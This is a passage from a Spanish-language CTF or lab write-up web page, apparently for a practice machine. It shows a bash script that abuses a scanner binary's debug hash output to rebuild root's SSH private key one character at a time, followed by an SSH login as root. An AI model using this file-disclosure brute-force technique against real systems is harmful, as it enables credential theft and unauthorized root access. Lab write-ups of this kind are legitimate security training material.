+                    <li><code>-p</code> — imprime el hash calculado (modo debug)</li>
+                    <li><code>-l</code> — máximo de bytes a hashear (por defecto 500)</li>
+                    <li><code>-s</code> — hash concreto contra el que comparar</li>
+                </ul>
+
+                <p>Estableciendo <code>-l 1</code> se hashea solo el primer byte del archivo y se imprime. Por ejemplo:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">./scanner</span> -c /root/.ssh/id_rsa -p -l 1 -s xd
+<span style="color:#abb2bf;">[DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327</span></code></pre>
+
+                <p>Verificando que el hash corresponde a <code>-</code> (el primer carácter de una clave privada OpenSSH estándar):</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"-"</span> | md5sum
+<span style="color:#abb2bf;">336d5ebc5436534e61d16e63ddfca327  -</span></code></pre>
+
+                <p>Los hashes coinciden. El ataque es claro: incrementando <code>-l</code> de uno en uno y comparando el hash devuelto contra el MD5 de <code>(prefijo_conocido + carácter_candidato)</code>, podemos hacer fuerza bruta al contenido del archivo carácter a carácter.</p>
+
+                <h3>Script de Fuerza Bruta</h3>
+
+                <pre><code class="language-bash"><span style="color:#7f848e;">#!/bin/bash
+# Uso: ./brute_scanner.sh /root/.ssh/id_rsa</span>
+
+<span style="color:#c678dd;">if</span> [ <span style="color:#d19a66;">$#</span> -ne 1 ]; <span style="color:#c678dd;">then</span>
+    <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"Usage: $0 &lt;path_to_file&gt;"</span>
+    <span style="color:#c678dd;">exit</span> 1
+<span style="color:#c678dd;">fi</span>
+
+<span style="color:#d19a66;">FILE_PATH</span>=<span style="color:#98c379;">"$1"</span>
+<span style="color:#d19a66;">CHARSET</span>=<span style="color:#98c379;">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\n -"</span>
+<span style="color:#d19a66;">RESULT</span>=<span style="color:#98c379;">""</span>
+<span style="color:#d19a66;">LENGTH</span>=1
+
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Starting hash brute force for: $FILE_PATH"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Building file character by character..."</span>
+
+<span style="color:#c678dd;">while</span> <span style="color:#c678dd;">true</span>; <span style="color:#c678dd;">do</span>
+    <span style="color:#d19a66;">HASH_OUTPUT</span>=$(<span style="color:#61afef;">./scanner</span> -c <span style="color:#98c379;">"$FILE_PATH"</span> -p -l <span style="color:#98c379;">"$LENGTH"</span> -s xd 2&gt;&amp;1)
+    <span style="color:#d19a66;">TARGET_HASH</span>=$(<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$HASH_OUTPUT"</span> | <span style="color:#61afef;">grep</span> <span style="color:#98c379;">"has hash"</span> | <span style="color:#61afef;">awk</span> <span style="color:#98c379;">'{print $NF}'</span>)
+
+    <span style="color:#c678dd;">if</span> [ -z <span style="color:#98c379;">"$TARGET_HASH"</span> ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] No hash returned - likely reached end of file"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+
+    <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Length $LENGTH - Target hash: $TARGET_HASH"</span>
+    <span style="color:#d19a66;">FOUND</span>=<span style="color:#d19a66;">false</span>
+
+    <span style="color:#c678dd;">while</span> IFS= <span style="color:#c678dd;">read</span> -r -n1 char; <span style="color:#c678dd;">do</span>
+        [ -z <span style="color:#98c379;">"$char"</span> ] &amp;&amp; char=<span style="color:#d19a66;">$'\n'</span>
+        <span style="color:#d19a66;">TEST_STRING</span>=<span style="color:#98c379;">"${RESULT}${char}"</span>
+        <span style="color:#d19a66;">TEST_HASH</span>=$(<span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"$TEST_STRING"</span> | <span style="color:#61afef;">md5sum</span> | <span style="color:#61afef;">awk</span> <span style="color:#98c379;">'{print $1}'</span>)
+
+        <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$TEST_HASH"</span> == <span style="color:#98c379;">"$TARGET_HASH"</span> ]; <span style="color:#c678dd;">then</span>
+            <span style="color:#d19a66;">RESULT</span>=<span style="color:#98c379;">"$TEST_STRING"</span>
+            <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[+] Found character at position $LENGTH: '$char'"</span>
+            <span style="color:#d19a66;">FOUND</span>=<span style="color:#d19a66;">true</span>
+            <span style="color:#c678dd;">break</span>
+        <span style="color:#c678dd;">fi</span>
+    <span style="color:#c678dd;">done</span> &lt; &lt;(<span style="color:#61afef;">echo</span> -n <span style="color:#98c379;">"$CHARSET"</span> | <span style="color:#61afef;">fold</span> -w1)
+
+    <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$FOUND"</span> = <span style="color:#d19a66;">false</span> ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] No matching character found for length $LENGTH"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+
+    <span style="color:#d19a66;">LENGTH</span>=$((<span style="color:#d19a66;">LENGTH</span> + 1))
+
+    <span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$LENGTH"</span> -gt 10000 ]; <span style="color:#c678dd;">then</span>
+        <span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[!] Reached safety limit of 10000 characters"</span>
+        <span style="color:#c678dd;">break</span>
+    <span style="color:#c678dd;">fi</span>
+<span style="color:#c678dd;">done</span>
+
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">""</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Extraction complete!"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Total characters extracted: ${#RESULT}"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"=== EXTRACTED CONTENT ==="</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$RESULT"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"========================="</span>
+
+<span style="color:#d19a66;">OUTPUT_FILE</span>=<span style="color:#98c379;">"extracted_$(basename $FILE_PATH)"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"$RESULT"</span> &gt; <span style="color:#98c379;">"$OUTPUT_FILE"</span>
+<span style="color:#61afef;">echo</span> <span style="color:#98c379;">"[*] Saved to: $OUTPUT_FILE"</span></code></pre>
+
+                <p>Tras ejecutarlo un rato, el script reconstruye con éxito la clave privada completa:</p>
+
+                <pre><code class="language-plaintext">[*] Extraction complete!
+[*] Total characters extracted: 2602
+
+=== EXTRACTED CONTENT ===
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAA
+(...)
+-----END OPENSSH PRIVATE KEY-----
+=========================</code></pre>
+
+                <p>Copio la clave a la máquina atacante, establezco los permisos correctos y me conecto por SSH como root:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">chmod</span> 600 extracted_id_rsa
+<span style="color:#61afef;">ssh</span> -i extracted_id_rsa root@10.129.229.27</code></pre>
+
+                <p>Acceso root obtenido. Máquina completada.</p>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
